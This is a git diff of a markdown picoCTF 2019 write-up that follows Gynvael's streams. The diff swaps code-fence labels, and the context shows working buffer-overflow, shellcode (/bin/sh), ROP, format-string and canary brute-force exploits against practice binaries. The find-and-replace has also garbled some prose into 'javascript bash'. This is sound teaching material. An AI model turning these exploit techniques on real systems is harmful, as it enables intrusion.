@@ -96,7 +96,7 @@ J.V. for the timestamps in Parts 2, 3, and 4.
 Gynvael gave up on this. Maybe it was too easy.
 
 ## Glory of the Garden - Forensics
-```console
+```bash
 $ file garden.jpg # This is to confirm that this file is actually a jpg
 garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, frames 3
 $ ls -la garden.jpg # Check size
@@ -161,7 +161,7 @@ Powers of 2: 8421
 ```
 ## handy-shellcode - Binary Exploitation 
 Connect to the shell server
-```console
+```bash
 $ ls -la  /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9
 total 732
 drwxr-xr-x   2 root       root                4096 Sep 28  2019 .
@@ -184,7 +184,7 @@ In main(), this line runs the input
 ```
 
 If we just run the program and put in input like asdf, the program will crash since asdf aren't valid instruction that can be executed
-```console
+```bash
 $ ./vuln
 Enter your shellcode:
 asdf
@@ -196,14 +196,14 @@ As we can see, the program just segfaults.
 
 
 However, if we use 0xC3 as the input, the program will run without crashing since 0xC3 is the 'ret' assembly instruction, so when we run the program with it as input, the program should exit without crashing.
-```console
+```bash
 $ echo -e '\xC3' | ./vuln 
 ```
 
 This confirms our assumptions of how the program runs. According to Gynvael, exploitation is a process where "everything can go wrong," so it's good to work with small steps to make sure our assumptions are correct.
 
 Find out what architecture the shellcode should be:
-```console
+```bash
 $ file vuln
 vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
 ```
@@ -216,14 +216,14 @@ We find some shellcode for spawning a shell [here](http://shell-storm.org/shellc
 ```
 
 Let's give vuln the shellcode as input
-```console
+```bash
 $ echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` | ./vuln
 Enter your shellcode:
 1Ph//shh/binPS
 Thanks! Executing now...
 ```
 The shellcode above doesn't seem to work, but it actually does. The program just exits after successfully running the shellcode and spawning a shell. In order to interact with the shell, we need to keep stdin open.
-```console
+```bash
 $ (echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`; cat) | ./vuln
 Enter your shellcode:
 1Ph//shh/binPS
@@ -237,7 +237,7 @@ Gynvael saves his shellcode to a file and then uses `cat shellcode - | ./vuln` i
 
 ## practice-run-1 - Binary Exploitation 
 Login to the shell server and just run the binary
-```console
+```bash
 $ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
 $ ls -la
 total 84
@@ -249,7 +249,7 @@ picoCTF{g3t_r3adY_2_r3v3r53}
 ```
 
 ## unzip - Forensics 
-```console
+```bash
 $ file flag.zip
 flag.zip: Zip archive data, at least v2.0 to extract
 $ strings flag.zip | grep pico # Grep2win doesn't work
@@ -294,7 +294,7 @@ Use the table
 
 ## First Grep - General Skills 
 Grep to win
-```console
+```bash
 $ cat file | grep pico
 picoCTF{grep_is_good_to_find_things_ad4e9645}
 ```
@@ -315,7 +315,7 @@ void sigsegv_handler(int sig) {
 ```
 
 To crash the program, just overflow the buffer by sending in more than buffer length
-```console
+```bash
 $ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 picoCTF{3asY_P3a5y1fcf81f9}
 ```
@@ -362,7 +362,7 @@ Set the admin cookie to True
 
 ## strings it - General Skills 
 Another grep to win
-```console
+```bash
 $ strings strings | grep pico
 picoCTF{5tRIng5_1T_c611cac7}
 ```
@@ -405,7 +405,7 @@ password.charAt(31) == '0'
 ```
 
 ## what's a net cat - General Skills 
-```console
+```bash
 $ nc -v 2019shell1.picoctf.com 37851
 Connection to 2019shell1.picoctf.com 37851 port [tcp/*] succeeded!
 You're on your way to becoming the net cat master
@@ -421,7 +421,7 @@ The robots.txt is a "sign" to tell web crawlers and search engines like Google n
 
 ## OverFlow 1 - Binary Exploitation
  Check what type of binary this is
-```console
+```bash
 $ file vuln
 vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
 ```
@@ -454,7 +454,7 @@ void flag() {
 We just have to overwrite the return address with the address of flag.
 
 Get the address of flag
-```console
+```bash
 $ objdump -d ./vuln | grep flag
 080485e6 <flag>:
  8048618:       75 1c                   jne    8048636 <flag+0x50>
@@ -463,7 +463,7 @@ The address of the flag() function is 0x80485e6
 
 Intel x86 uses little endian so use e6 85 04 08  when overwriting the ret address
 
-```console
+```bash
 $ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xe6\x85\x04\x08' | ./vuln
 Give me a string and lets see what happens:
 Woah, were jumping to 0x80485e6 !
@@ -473,20 +473,20 @@ We use more than 64 bytes because there's some padding and other stuff we have t
 
 ## So Meta - Forensics 
 Grep to win
-```console
+```bash
 $ strings  pico_img.png | grep pico
 picoCTF{s0_m3ta_43f253bb}
 ```
 
 or use exiftool to look at metadata
-```console
+```bash
 $ exiftool pico_img.png | grep pico
 File Name                       : pico_img.png
 Artist                          : picoCTF{s0_m3ta_43f253bb}
 ```
 
 ## What Lies Within - Forensics
-```console
+```bash
 $ strings buildings.png | grep pico # Always grep to win
 $ file buildings.png
 buildings.png: PNG image data, 657 x 438, 8-bit/color RGBA, non-interlaced
@@ -521,7 +521,7 @@ Data is hidden using the least significant bit. E.g. for a color 0x31708f, the f
 Use an online [decoder](https://stylesuxx.github.io/steganography/). If you've never implemented LSB steg, then that's another thing you should implement according to Gynvael.
 
 ## Extensions - Forensics
-```console
+```bash
 $ strings flag.txt | grep pico # Grep to win
 $ file flag.txt
 flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
@@ -621,7 +621,7 @@ if (checkpass[_0x4b5b('0x2')](16, 24) == _0x4b5b('0x6'))
 if (checkpass[_0x4b5b('0x2')](12, 16) == _0x4b5b('0x7'))
 ```
 
-We can use the javascript console to figure out that \_0x4b5b('0x2') is just substring so all the checkpass[\_0x4b5b('0x2')] can be replaced with checkpass['substring']
+We can use the javascript bash to figure out that \_0x4b5b('0x2') is just substring so all the checkpass[\_0x4b5b('0x2')] can be replaced with checkpass['substring']
 ```js
 if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
 if (checkpass['substring'](7, 9) == '{n')
@@ -642,7 +642,7 @@ if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
 if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
 ```
 
-Use the javascript console to figure out what \_0x4b5b('0x3') and so on are.
+Use the javascript bash to figure out what \_0x4b5b('0x3') and so on are.
 ```js
 if (checkpass['substring'](0, 8) == "picoCTF{")
 if (checkpass['substring'](8, 16) == "not_this")
@@ -654,7 +654,7 @@ Piece the flag together using above:
 picoCTF{not_this_again_39d025}
 
 ## First Grep: Part II - General Skills 
-```console
+```bash
 $ rgrep pico
 files1/file22:picoCTF{grep_r_to_find_this_af11356f}
 ```
@@ -671,7 +671,7 @@ Gynvael adds an admin="True" cookie, but it doesn't do anything.
 Gynvael looks at session data.
 
 But it turns out you just had to set the cookies:
-In the javascript console
+In the javascript bash
 ```javascript
 > document.cookie="time=1400"
 > document.cookie="admin=True"
@@ -695,7 +695,7 @@ Change the user agent to picobrowser
 Use Chrome DevTools and create a new emulated device with user agent string "picobrowser"
 
 or use curl
-```console
+```bash
 $ curl -A picobrowser https://2019shell1.picoctf.com/problem/12255/flag | grep "pico"
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -705,7 +705,7 @@ $ curl -A picobrowser https://2019shell1.picoctf.com/problem/12255/flag | grep "
 ```
 
 ## plumbing - General Skills
-```console
+```bash
 $ nc -v 2019shell1.picoctf.com 21957 | grep pico
 Connection to 2019shell1.picoctf.com 21957 port [tcp/*] succeeded!
 picoCTF{digital_plumb3r_c1082838}
@@ -715,7 +715,7 @@ picoCTF{digital_plumb3r_c1082838}
 You must know [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) for this task, but "it's really simple."
 
 Connect to the quiz using netcat:
-```console
+```bash
 $ nc -v 2019shell1.picoctf.com 61751
 Connection to 2019shell1.picoctf.com 61751 port [tcp/*] succeeded!
 Good morning class! It's me Ms. Adleman-Shamir-Rivest
@@ -903,7 +903,7 @@ Some attacks: If e is too small
 
 ## slippery-shellcode - Binary Exploitation
 Check for
-```console
+```bash
 $ checksec --file ./vuln
 [*] '/problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48/vuln'
     Arch:     i386-32-little
@@ -932,7 +932,7 @@ We need a nopsled since the code randomizes where we run the buffer.
 We can use a nopsled to fill the buffer so that it doesn't really matter where in the nopsled the cpu starts executing from. 
 
 For our shellcode, we can use c library functions, since the binary is statically linked:
-```console
+```bash
 $ file vuln
 vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=df86b06c60f9f6b307f6d381d8498245c4d3691c, not stripped
 ```
@@ -979,13 +979,13 @@ n1:
  
 ```
 Save above shellcode as a file like asdf.asm and then compile
-```console
+```bash
 $ nasm asdf.asm
 ```
 This produces a binary called asdf
 
 To pass the shellcode as input to the program:
-```console
+```bash
 $ cat ~/asdf | ./vuln
 
 Enter your shellcode:
@@ -1071,7 +1071,7 @@ print f
 
 ## where-is-the-file - General Skills
 Connect to the shell server  
-```console
+```bash
 $ ssh username@2019shell1.picoctf.com
 Enter your platform password (characters will be hidden):
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1060-aws x86_64)
@@ -1109,7 +1109,7 @@ $ python
 Gynvael decides to do another forensics problem and saves the binary exploitation one for later.  
 
 The file command just tells us the file is data.
-```console
+```bash
 $ file mystery
 mystery: data
 ```
@@ -1120,7 +1120,7 @@ Use Gynvael's brute zlib decompressor code at [https://github.com/gynvael/random
 
 Just change `data, unused = DecompressStream(d[i:i+128])` to `data, unused = DecompressStream(d[i:i+1024000]) # Just change 128 to a  large number` since the mystery file is large. The png has a zlib marker so that when the decompression is done, the program will exit.
 
-```console
+```bash
 $ python go.py ./mystery
 Some data at 0000005b
 Some data at 0000005d
@@ -1220,7 +1220,7 @@ We needed BUFLENGTH + 12 characters.
 Pretty much the same thing as the 32 bit one.  
 
 Get the address of the flag:
-```console
+```bash
 $ objdump -x vuln # Just display all the functions and things in the binary
 ...
 0000000000000000       F *UND*  0000000000000000              fopen@@GLIBC_2.2.5
@@ -1242,7 +1242,7 @@ Previously, we just guessed how much padding to add to overwrite the return addr
 
 Note: In the stream Gynvael looks at the flag() function disasssembly by mistake when he should in fact look at the vuln() function's disassembly to make the exploit since that's the function that calls gets(). 
 
-```console
+```bash
 $ objdump -Mintel -d vuln
 ...
 00000000004007cc <vuln>:
@@ -1268,14 +1268,14 @@ As we can see from the disassembly above, when the `ret` instruction is called, 
 So we need 64 A's to overwrite the buffer and then another 8 A's to overwrite the saved rbp for a total of 72. Then we can overwrite the saved return address with the address of flag().   
 
 Exploit
-```console
+```bash
 $ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00" | ./vuln
 Welcome to 64-bit. Give me a string that gets you the flag:
 Segmentation fault (core dumped)
 ```
 
 However, when the above, it doesn't seem to work. Let's run it in gdb:
-```console
+```bash
 $ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00" > ~/asdf # save the exploit to a file
 $ gdb ./vuln
 (gdb) r < ~/asdf # Run the program in gdb with the file's contents as our input
@@ -1289,7 +1289,7 @@ It looks like the exploit actually worked in gdb. When you run a program using g
 To confirm that we're actually overwriting the return address on the shell server outside of gdb, we can look for an instruction/function in the binary that will allow us to see if we have control of the return address. Gynvael looks for the 0xEBFE or infinite loop instruction in the binary, but there isn't one. Instead we can try calling `puts("Welcome to 64-bit. Give me a string that gets you the flag: ");` since that will show us if we overwrite the return address. This technique is a common strategy for confirming that we have control of the return address.  
 
 These two lines are what we want called to call the puts() function in main().
-```console
+```bash
 $ objdump -Mintel -d vuln
 ...
   400834:       48 8d 3d ed 00 00 00    lea    rdi,[rip+0xed]        # 400928 <_IO_stdin_used+0x48>
@@ -1298,7 +1298,7 @@ $ objdump -Mintel -d vuln
 ```
 
 We want to call address 0x400834 since we need to load the string into rdi as a parameter before calling puts. Use that as the return address we're overwriting.
-```console
+```bash
 $ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x08\x40\x00\x00\x00\x00\x00" | ./vuln
 Welcome to 64-bit. Give me a string that gets you the flag:
 Welcome to 64-bit. Give me a string that gets you the flag:
@@ -1317,7 +1317,7 @@ The next technique we can try is using the address instruction after the start o
 ```
 
 Let's try 0x400768 instead of 0x400768 (address of flag()).
-```console
+```bash
 $ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x68\x07\x40\x00\x00\x00\x00\x00" | ./vuln
 Welcome to 64-bit. Give me a string that gets you the flag:
 picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}
@@ -1392,7 +1392,7 @@ If we keep on subtracting from our account balance by buying a bunch of the fake
 If we buy more than around 2 billion worth of flags, the worth of the flags will wrap around to around negative 2 billion. Then when we subtract a negative amount of money from our balance, it actually adds all that money to our account.  
 
 Each "fake" flag costs 900 to buy, so we need to buy around 2386092 fake flags since 2147483647/900=2386092. But in order to get *past* 2147483647, we need more than that. We also need to take the intial balance of 1100 into account as well.  So we have to buy around 2386095 fake flags to get our account balance to a very large positive number. Then with that balance we can buy the real flag.
-```console
+```bash
 $ nc 2019shell1.picoctf.com 63894
 Welcome to the flag exchange
 We sell flags
@@ -1560,7 +1560,7 @@ ret
 ```
 
 Compile and run with [asmloader (32 bit version)](https://github.com/gynvael/asmloader):
-```console
+```bash
 $ nasm test.S
 $ gdb ./asmloader
 (gdb) run test
@@ -1638,7 +1638,7 @@ void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_
 We *could* actually pass the right arguments to the above functions and then call the functions to try and set the win1 and win2 global variables, but it's much easier to just skip the if cases and jump directly to the `win1 = true;` and `win2 = true;`.  
 
 Use the checksec tool to see what mitigations are in place in the binary:
-```console
+```bash
 $ checksec --file=vuln
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols        FORTIFY  Fortified   Fortifiable  FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     No       0           3            vuln
@@ -1771,7 +1771,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07
 ```
 
 Pipe our exploit into the vuln program:
-```console
+```bash
 $ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
 Welcome to 64-bit. Can you match these numbers?
 Segmentation fault (core dumped)
@@ -1805,7 +1805,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08
 ```
 
 When we use the modified exploit, it works.
-```console
+```bash
 $ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08\x40\x00\x00\x00\x00\x00\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
 Welcome to 64-bit. Can you match these numbers?
 picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}
@@ -1973,7 +1973,7 @@ def asm2(arg1, arg2):
 print(hex(asm2(0xc,0x15)))
 ```
 
-```console
+```bash
 $ python test.py
 0x105
 ```
@@ -1984,7 +1984,7 @@ This approach of translating into a higher level language is a standard way of r
 A canary is just a random value on the stack in between the local variables and the return address. Thus if an attacker overwrites it by trying to overwrite the return address, the attacker will change the value of the canary and the program will exit immediately.  
 
 Reconissance:
-```console
+```bash
 $ file vuln
 vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6cfe75e5f3db954bad5a09eb57527c5a0d727b8f, not stripped
 $ checksec --file=vuln
@@ -2113,18 +2113,18 @@ call(33, canary) # Test the call function
 ```
 
 Test the script locally:
-```console
+```bash
 $ python go.py
 [ERROR]: Trying to Read Canary
 ```
 
 The above error occurs because the binary is trying to open up the canary.txt file. Let's create it:
-```console
+```bash
 $ echo -n ASDF > canary.txt
 ```
 
 The error still occurs:
-```console
+```bash
 $ python go.py
 [ERROR]: Trying to Read Canary
 ```
@@ -2138,7 +2138,7 @@ Use a hex editor to change the hardcoded path which looks like the following:
 to something like `canary.txt`. After patching the binary, the program will look for the canary.txt in the current directory.
 
 Now the script works:
-```console
+```bash
 $ python go.py
 Please enter the length of the entry:
 > Input> *** Stack Smashing Detected *** : Canary Value Corrupt!
@@ -2174,7 +2174,7 @@ for i in xrange(4):
 ```
 
 The script works locally:
-```console
+```bash
 $ python go.py
 65
 83
@@ -2183,7 +2183,7 @@ $ python go.py
 ```
 
 Testing on remote (make sure to change the path in the script):
-```console
+```bash
 $ python ~/go.py
 51
 51
@@ -2225,7 +2225,7 @@ for i in xrange(32):
 ```
 
 Now run the above script on the remote server
-```console
+```bash
 user@pico-2019-shell1:/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0$ python ~/asdf.py
 Please enter the length of the entry:
 > Input> Ok... Now Where's the Flag?
@@ -2342,7 +2342,7 @@ p = bytes.fromhex(b)
 print(p)
 ```
 
-```console
+```bash
 $ python3 a.py
 b'picoCS\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
 ```
@@ -2361,7 +2361,7 @@ a, _ = gmpy2.iroot(c, e)
 print(bytes.fromhex(hex(a)[2:]))
 ```
 
-```console
+```bash
 $ python3 a.py
 b'picoCTF{n33d_a_lArg3r_e_ff7cfba1}'
 ```
@@ -2425,7 +2425,7 @@ Lots of red herrings that Gynvael spent time on. Gynvael tries a lot of approach
 Gynvael uses network miner, doesn't find too much.
 
 Use strings
-```console
+```bash
 $ strings capture.pcap | grep "picoCTF"
 picoCTF Sure is fun!CmP]2
 I really want to find some picoCTF flagsEmP]m=
@@ -2545,7 +2545,7 @@ for p in d:
 print(flag)
 ```
 
-```console
+```bash
 $ python3 go.py
 ddddddddddddddddddddddddddddddBBKKKKKBBBBBBBBBBBBBKKKKKBBBKKBKBBCBBBBBeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeBBBBKKKBBKKKKBBPOONMMKdn
 ```
@@ -2589,7 +2589,7 @@ for p in d:
 print(flag)
 ```
 
-```console
+```bash
 $ python3 go.py
 ...
 5097
@@ -2643,7 +2643,7 @@ print(flag)
 print(flag.replace("a", ""))
 ```
 
-```console
+```bash
 $ python3 go.py
 ...
 5097
@@ -2664,7 +2664,7 @@ picoCTF{p1LLf3r3d_dt_v1_st3g0}
 When we submit `picoCTF{p1LLf3r3d_dt_v1_st3g0}` as the flag, it seems to be incorrect. We probably removed too many a's. With a bit of guesing we figure out that that the `dt` part of the flag should be `data` and that `v1` should be `v1a` (via), which makes the actual flag `picoCTF{p1LLf3r3d_data_v1a_st3g0}`.
 
 ## leap-frog - Binary Exploitation
-```console
+```bash
 $ checksec --file ./rop
 [*] '/problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9/rop'
     Arch:     i386-32-little
@@ -2742,7 +2742,7 @@ void leap3() {
 Setting arguments is boring according to Gynvael, so he wants to use gets() on the address of win1 to set all 3 global variables since they are adjacent to each other in memory. Then we can just call the display_flag() function. If we look at the assembly we see that ` test   %al,%al` is used to check the global variables. This only tests to make sure the global vars are non zero, so we can use any non zero value to overwrite the 3 global variables.  
 
 Find the address of gets() using IDA or objdump or Ghidra.
-```console
+```bash
 $ objdump -d ./rop
 ...
 08048430 <gets@plt>:
@@ -2752,7 +2752,7 @@ $ objdump -d ./rop
 ```
 
 The address of gets is 0x08048430. The address of display_flag is 0x080486b3. Gynvael uses IDA to look for the address of win1, but you can use gdb as well:
-```console
+```bash
 $ gdb ./rop
 (gdb) p &win1
 $1 = (<data variable, no debug info> *) 0x804a03d <win1>
@@ -2802,7 +2802,7 @@ AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nAB
 ```
 
 Use echo to send it to the binary:
-```console
+```bash
 $ echo -e -n 'AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n' # -e is for interpreting the \x and the -n is to omit new line
 ```
 
@@ -2819,7 +2819,7 @@ A viewer asked if it's possible to jump to directly into the display_flag(). It 
 
 ## reverse_cipher - Reverse Engineering
 We get a file and a x64 binary. The rev file contains part of the flag:
-```console
+```bash
 $ less rev_this
 picoCTF{w1{1wq83k055j5f}
 rev_this (END)
@@ -2884,13 +2884,13 @@ for i in range(8, 23):
 print(d)
 ```
 
-```console
+```bash
 $ python3 asdf.py
 bytearray(b'picoCTF{r3v3rs35f207e7a}')
 ```
 
 ## stringzz - Binary Exploitation
-```console
+```bash
 $ checksec --file=./vuln
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
 Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols   
@@ -2935,7 +2935,7 @@ char * buf = malloc(sizeof(char)*FLAG_BUFFER);
 ``` 
 
 Let's test the program:
-```console
+```bash
 $ echo '%x' | ./vuln
 input whatever string you want; then it will be printed back:
 
@@ -2948,7 +2948,7 @@ a
 Since `a` is printed out, it means that there was a decimal 10 somewhere on the stack. This shows us that there is indeed a format string vulnerability in the program.  
 
 This tries to read from the first thing on the stack. It crashes because the program is trying to read from address 0xa.
-```console
+```bash
 $ echo '%1$s' | ./vuln
 input whatever string you want; then it will be printed back:
 
@@ -2960,7 +2960,7 @@ Segmentation fault (core dumped)
 ```
 
 Now we can just incrementing the 1 in `'%1$s'` until we find the location of the flag.
-```console
+```bash
 $ echo '%2$s' | ./vuln
 input whatever string you want; then it will be printed back:
 
@@ -2997,7 +2997,7 @@ will be printed:
 and so on...  
 
 Gynvael keeps doing this until he gets to 37:
-```console
+```bash
 $ echo '%37$s' | ./vuln
 input whatever string you want; then it will be printed back:
 
@@ -3125,7 +3125,7 @@ for i in range(8):
     f.write(a[i])
 ```
 
-```console
+```bash
 $ python3 go.py
 $ ls
 ctf.png  ctf.raw  go.py  plane0.raw  plane1.raw  plane2.raw  plane3.raw  plane4.raw  plane5.raw  plane6.raw  plane7.raw
